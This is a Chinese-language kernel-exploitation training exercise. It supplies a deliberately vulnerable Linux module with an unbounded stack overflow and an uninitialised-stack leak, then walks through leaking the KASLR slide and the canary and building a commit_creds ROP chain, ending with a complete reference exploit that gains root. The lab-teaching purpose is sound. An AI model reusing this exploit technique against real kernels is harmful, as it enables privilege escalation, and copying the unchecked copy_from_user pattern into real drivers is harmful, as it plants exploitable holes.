# 練習 A — 從 stack overflow 到 root shell

> 目標：在 SMEP + SMAP + stack canary + KASLR + KPTI **全開**的 kernel 上，從一個 stack overflow + uninit leak 的 module 寫出完整 exploit 拿 root。整合 Ch 4–8 所有內容。

## 題目規格

給你一個 vulnerable module（下面會提供）與一個 kernel，**禁止**修改 kernel config 關 mitigation。你只能：

- 透過 module 提供的 ioctl 互動
- 讀 `/proc/kallsyms`（kptr_restrict=1，所以看不到真地址）
- 讀 `/proc/self/maps`
- 用 `gcc -static` 編 exploit

最終目標：拿到 uid=0 的 shell。

## 給你的 vulnerable module

```c
// practice-a/vuln.c
#include <linux/module.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>

struct echo_req { size_t len; char __user *buf; };
#define VULN_ECHO  _IOW('v', 1, struct echo_req)
#define VULN_PEEK  _IOR('v', 2, char[256])

static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
    char local[64];     /* 故意不清零 — uninit leak */
    struct echo_req req;

    switch (cmd) {
    case VULN_ECHO:
        if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
            return -EFAULT;
        /* 洞：req.len 無上限 */
        if (copy_from_user(local, req.buf, req.len))
            return -EFAULT;
        return 0;

    case VULN_PEEK:
        /* leak：64 byte local 未清零就 copy_to_user */
        if (copy_to_user((void __user *)arg, local, 64))
            return -EFAULT;
        return 0;

    default:
        return -ENOTTY;
    }
}

static const struct file_operations fops = {
    .owner = THIS_MODULE, .unlocked_ioctl = vuln_ioctl,
};
static struct miscdevice md = {
    .minor = MISC_DYNAMIC_MINOR, .name = "vuln", .fops = &fops, .mode = 0666,
};
static int __init m_init(void) { return misc_register(&md); }
static void __exit m_exit(void) { misc_deregister(&md); }
module_init(m_init);
module_exit(m_exit);
MODULE_LICENSE("GPL");
```

## Kernel config

```
CONFIG_STACKPROTECTOR=y
CONFIG_STACKPROTECTOR_STRONG=y
CONFIG_RANDOMIZE_BASE=y
CONFIG_PAGE_TABLE_ISOLATION=y
CONFIG_RETPOLINE=y
CONFIG_SMEP / SMAP=y  （由 QEMU -cpu 啟用）
```

建立：

```bash
cd ~/kpwn/kernel/linux-6.6.60-weak
./scripts/config --enable STACKPROTECTOR
./scripts/config --enable STACKPROTECTOR_STRONG
./scripts/config --enable RANDOMIZE_BASE
./scripts/config --enable PAGE_TABLE_ISOLATION
./scripts/config --enable RETPOLINE
make -j$(nproc) bzImage
```

`run-weak.sh` 的 `-append` 設為 `"console=ttyS0 quiet panic=1 oops=panic"`（不要加 `nokaslr`、`nopti`、`nosmep`）。

## 實作步驟建議

### Step 1 — 測 VULN_PEEK 穩定性

寫個 trigger 連呼 `VULN_PEEK` 100 次，把 64 byte 印成 8×8 qword。**關 KASLR boot** 一次，看哪個 offset 是 kernel text（`0xffffffff81...` 起頭，且 < `0xffffffffc0...`）。

記下這個 offset — 例如是 `qword[3]`。

### Step 2 — 從 vmlinux 查該 offset 對應什麼 symbol

不開 KASLR 時你看到的 leak 是例如 `0xffffffff810cxxxx`。用 `nm` 找最近的 symbol：

```bash
nm ~/kpwn/kernel/linux-6.6.60-weak/vmlinux | sort | awk '$1 <= "0xffffffff810cxxxx" {s=$0} END {print s}'
# 輸出類似：ffffffff810cabcd T some_function
```

這個 symbol 的編譯時地址就是你算 slide 的基準。

### Step 3 — 開 KASLR 寫 `leak_slide()`

```c
unsigned long leak_slide(int fd) {
    unsigned long buf[8];
    ioctl(fd, VULN_PEEK, buf);
    unsigned long leaked = buf[OFFSET_FROM_STEP1];
    return leaked - KNOWN_SYMBOL_ADDR_FROM_STEP2;
}
```

### Step 4 — 再做一個 leak：canary

canary 在同一個 stack frame 上，但 offset 不同（在 return addr 前面幾 qword）。相同 VULN_PEEK 只讀 64 byte，canary 在 offset 64 以後 — **讀不到**。

怎麼辦？兩條路：

- **A**：修 ioctl 讓它 leak 更多。但你不能改 module。
- **B**：換 primitive — 利用 `VULN_ECHO` 的 read 方向其實不存在、但 kernel 在 overflow 時寫到 canary offset 會 `__stack_chk_fail`。思考：**overflow 寫入但不覆蓋 canary**（只寫到 64 byte）會不會爆？不會 — canary 在 offset 64 之後。

看這個 module，你寫 64 byte 不爆、寫 72 byte 就爆（打到 canary）。

所以**這題 canary 不是問題**：你只要寫到 offset < 64 位就不觸發 canary check。但這樣 ret addr 在 72+，你 overflow 必須跨越 canary — 要寫對 canary。

**轉換題目**：怎麼 leak canary？

答案：**利用 uninit `local`**。stack 上除了 return address / rbp / canary 外還有 caller 的 canary — caller 是 `__do_vfs_ioctl` 之類，也用同一個 per-CPU canary。**canary 同一個 task 在同一個 CPU 上是固定的**。

VULN_PEEK 時 `local[64]` 裡 offset 0-64 之間可能躺著上次 call 的 canary（保留在 stack）。寫個測試：先 ioctl(ECHO) 推進 stack，然後 ioctl(PEEK) 看 64 byte 有沒有一個 qword 是 **canary-shaped**（最後一 byte 是 `0x00` — Linux canary 最後一 byte 永遠為 0 防 string 類漏洞）。

### Step 5 — 組合 ROP

手上有：`slide` + `canary`。gadget 地址全部 = NOSLIDE + slide。

chain（payload 總長 ≥ 160 byte）：

```
offset 0..63  : junk
offset 64..71 : canary
offset 72..79 : fake rbp
offset 80+    : ROP:
    pop rdi; ret
    init_cred
    commit_creds
    swapgs_restore_regs_and_return_to_usermode + proper_offset
    [N 個 0 — pop regs 序列]
    iretq frame: user_rip, user_cs, user_rflags, user_rsp, user_ss
```

**proper_offset 你要自己 gdb 查**，因為開 KASLR 下你得用 `slide` 動態算。流程：

1. 在 Ch 0 那份**關 KASLR**的 kernel 上 `gdb-multiarch vmlinux`，`disas swapgs_restore_regs_and_return_to_usermode`，數 pop 數量
2. 記下 pop 個數 N
3. exploit 裡 chain 後面填 N 個 0 再接 5-word iretq frame

### Step 6 — 用 signal trampoline 的簡化版（加分）

嫌 pop 序列麻煩：signal handler 版本只要 chain 結尾 pad 一個爛地址：

```c
chain[i++] = POP_RDI_RET + slide;
chain[i++] = INIT_CRED + slide;
chain[i++] = COMMIT_CREDS + slide;
chain[i++] = 0xdeadbeef;   /* crash → SIGSEGV → handler */
```

記得 `main` 一開始 `sigaction(SIGSEGV, ...)`。

### Step 7 — 提權後

`commit_creds(init_cred)` 已經讓 cred 變 root。handler 裡 `system("/bin/sh")` 或 `execve("/bin/sh", ...)`。

## 期望輸出

```
/ # id
uid=1000(user) gid=1000(user)
/ # insmod /vuln.ko
/ # /home/user/exp
[+] leaked kernel addr: ffffffff9212abcd
[+] kernel slide: 0x11200000
[+] canary: 0x8f3c1abcdef12300
[+] triggering overflow, ROP chain size = 192
[+] returning to shell()
# id
uid=0(root) gid=0(root)
#
```

## 完整參考解答

**寫完再看！不要偷看**，否則學不到東西。

<details>
<summary>點開參考實作</summary>

```c
// ~/kpwn/exploit/practice-a/exp.c
// 編譯: gcc -static -O0 -masm=intel -o exp exp.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/ioctl.h>

struct echo_req { size_t len; char *buf; };
#define VULN_ECHO  _IOW('v', 1, struct echo_req)
#define VULN_PEEK  _IOR('v', 2, char[256])

/* 從 vmlinux nm 查的編譯時地址（nokaslr baseline） */
#define KNOWN_SYM_NOSLIDE      0xffffffff810c1234UL  /* VULN_PEEK leak 穩定看到的那個 symbol */
#define POP_RDI_RET_NOSLIDE    0xffffffff81034a22UL
#define COMMIT_CREDS_NOSLIDE   0xffffffff810c4b30UL
#define INIT_CRED_NOSLIDE      0xffffffff82e3c3e0UL

static unsigned long slide, canary;

static void shell_handler(int sig, siginfo_t *si, void *ctx) {
    system("/bin/sh");
    exit(0);
}

static unsigned long leak_slide(int fd) {
    unsigned long buf[8] = {0};
    ioctl(fd, VULN_PEEK, buf);
    for (int i = 0; i < 8; i++) printf("[leak %d] %016lx\n", i, buf[i]);
    /* Step 1 的 offset；我們這裡假設是 qword[3] */
    return buf[3] - KNOWN_SYM_NOSLIDE;
}

/* Linux canary 最後 byte = 0x00；用它辨識 */
static unsigned long leak_canary(int fd) {
    /* 先觸發一次 ECHO 推進 stack，讓 canary 留在 local[] 範圍 */
    char dummy[128] = {0};
    struct echo_req req = { .len = 8, .buf = dummy };
    ioctl(fd, VULN_ECHO, &req);  /* 只寫 8 byte，不爆 canary */
    
    unsigned long buf[8] = {0};
    ioctl(fd, VULN_PEEK, buf);
    for (int i = 0; i < 8; i++) {
        /* canary 特徵：非零、最後 byte = 0x00 */
        if (buf[i] != 0 && (buf[i] & 0xff) == 0x00 &&
            buf[i] != slide + KNOWN_SYM_NOSLIDE) /* 排除 kernel text */
            return buf[i];
    }
    fprintf(stderr, "[-] canary not found\n");
    exit(1);
}

int main(void) {
    struct sigaction sa = { .sa_sigaction = shell_handler, .sa_flags = SA_SIGINFO };
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);

    int fd = open("/dev/vuln", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    slide = leak_slide(fd);
    printf("[+] slide = %lx\n", slide);

    canary = leak_canary(fd);
    printf("[+] canary = %lx\n", canary);

    unsigned long chain[32];
    int i = 0;
    /* offset 0-63: 64 byte junk */
    for (; i < 8; i++) chain[i] = 0x4141414141414141UL;
    /* offset 64: canary */
    chain[i++] = canary;
    /* offset 72: fake rbp */
    chain[i++] = 0x4242424242424242UL;
    /* offset 80: ROP */
    chain[i++] = POP_RDI_RET_NOSLIDE + slide;
    chain[i++] = INIT_CRED_NOSLIDE + slide;
    chain[i++] = COMMIT_CREDS_NOSLIDE + slide;
    chain[i++] = 0xdeadbeef;    /* SIGSEGV → handler */

    struct echo_req req = { .len = i * 8, .buf = (char*)chain };
    ioctl(fd, VULN_ECHO, &req);

    /* 不會走到這 — handler 已 exec shell */
    fprintf(stderr, "[-] never reached\n");
    return 0;
}
```

編譯：

```bash
gcc -static -O0 -masm=intel -o ~/kpwn/exploit/practice-a/exp exp.c
```

</details>

## 測試用例

- **canary 開 / KASLR 開 / KPTI 開 / SMEP/SMAP 開** — 所有 mitigation 都 on，exploit 應拿 root
- **nokaslr 下跑** — slide 應為 0，正常運作
- **跑 100 次** — 應有 > 95% 成功率；若偶爾失敗可能是 leak offset 不穩（回 Step 1 重新選穩定 offset）
- **guest 重開 boot 後跑一次** — slide 會不同，exploit 應自適應

## 自我檢核

- [ ] 能在全 mitigation 下從 crash log 看不出自己在做什麼（kernel panic 已不會發生）
- [ ] `leak_slide` 函式能在 80% 以上呼叫穩定拿到 slide
- [ ] 知道為什麼 canary 的最後 byte 永遠是 `0x00`
- [ ] 能解釋 signal trampoline 為什麼比 swapgs_restore 短
- [ ] 看到 kernel panic log 能從 RIP 回推哪個 ROP gadget 錯了
- [ ] 理解 stack overflow 在現代 kernel 上為什麼仍有攻擊面（只要有 uninit leak）

Part 2 全線通過。下一章切入 heap 戰場，你會發現 stack overflow 這種「線性連續寫一長段」的原語在 heap 上變成「寫相鄰 object 的第一個 qword」— 機制不同，思路完全翻新。

→ [Ch 9 — Heap Overflow in kmalloc：相鄰 object 布局與 cache 選擇](./09-heap-overflow.md)
